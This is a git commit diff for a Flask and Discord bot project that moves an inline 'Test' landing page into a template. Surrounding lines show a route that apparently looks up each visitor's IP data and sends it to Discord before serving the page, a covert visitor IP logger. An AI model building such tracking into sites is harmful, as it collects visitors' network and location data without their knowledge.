660668524622d83530bbc6fe4eaf9b64e53ffe38
itsnotfridayet <jacedill@outlook.com>
2025-07-14 11:50:23 -0600

    Moved landing page to a serperate file

--- main.py
+++ main.py
@@ -6,7 +6,7 @@ import xmltodict
 import datetime
 import threading
 import asyncio
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, render_template
 from dotenv import load_dotenv
 from discord.ext import commands
 from discord.ext import tasks
@@ -80,31 +80,7 @@ def get_ip():
     data = json.loads(response.text)
     send_ip_to_discord(ip, data)
     #return response.json()  # Return the JSON response directly
-    return '''
-    <html>
-      <head>
-        <title>Test</title>
-        <style>
-          body {
-            background-color: #111;
-            color: #0f0;
-            font-family: monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-          }
-          h1 {
-            font-size: 5rem;
-          }
-        </style>
-      </head>
-      <body>
-        <h1>Test</h1>
-      </body>
-    </html>
-    '''
+    return render_template("index.html")
 
 def run_flask():
     app.run(host='0.0.0.0', port=OUTSIDE_PORT)
